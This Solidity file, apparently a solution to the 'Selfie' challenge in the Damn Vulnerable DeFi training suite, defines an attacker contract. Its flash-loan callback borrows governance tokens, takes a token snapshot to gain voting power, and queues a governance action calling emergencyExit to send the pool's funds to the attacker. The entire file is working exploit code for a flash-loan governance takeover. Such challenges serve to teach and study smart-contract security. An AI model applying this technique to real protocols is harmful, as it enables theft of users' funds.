// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "solmate/src/auth/Owned.sol";
import "../DamnValuableTokenSnapshot.sol";


/**
 * @title SelfieAttacker
 * @author Igor Coser
 */
contract SelfieAttacker is Owned{

    address private token;
    address private selfiePool;
    address private governance;
    error NotInitiatedByOwner();

    constructor(address _token, address _selfiePool, address _governance) Owned(msg.sender){
        token = _token;
        selfiePool = _selfiePool;
        governance = _governance;
    }

    function onFlashLoan(address initiator, address _token, uint256 amount, uint256 x, bytes calldata) external returns (bytes32){
        if(initiator != owner || msg.sender != selfiePool){
            revert NotInitiatedByOwner();
        }
        ERC20(_token).approve(selfiePool, amount);
        DamnValuableTokenSnapshot(_token).snapshot();
        SimpleGovernance(governance).queueAction(selfiePool, 0, abi.encodeWithSignature("emergencyExit(address)", initiator));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
